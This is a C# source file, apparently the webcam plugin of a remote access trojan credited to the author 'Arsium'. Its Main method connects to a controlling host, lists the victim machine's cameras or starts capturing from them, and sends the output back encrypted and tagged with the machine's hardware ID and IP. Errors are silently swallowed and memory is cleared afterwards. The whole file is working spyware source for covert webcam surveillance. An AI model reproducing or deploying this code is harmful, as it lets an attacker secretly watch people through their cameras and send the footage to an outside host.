using Shared;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                Shared.PacketType T = (Shared.PacketType)Param[0];
                Data D = new Data();
                switch (T)
                {
                    case PacketType.GET_CAMERAS:
                        {
                            List<string> CameraList = Functions.GetCameras();
                            D.HWID = HWID;
                            D.Type = PacketType.GET_CAMERAS;
                            D.DataReturn = new object[] { CameraList };
                            D.IP_Origin = BaseIP;
                            await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                            break;
                        }

                    case PacketType.CAPTURE_CAMERA:
                        Socket SCam = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IPEndPoint epCam = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                        SCam.Connect(epCam);
                        Functions.C = new Client(SCam);
                        Functions.hasToCapture = true;
                        Functions.Capture((int)Param[1], (int)Param[2], H, HWID, key, BaseIP);
                        break;

                }
                S.Close();
                S.Dispose();
            }
            catch { }
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
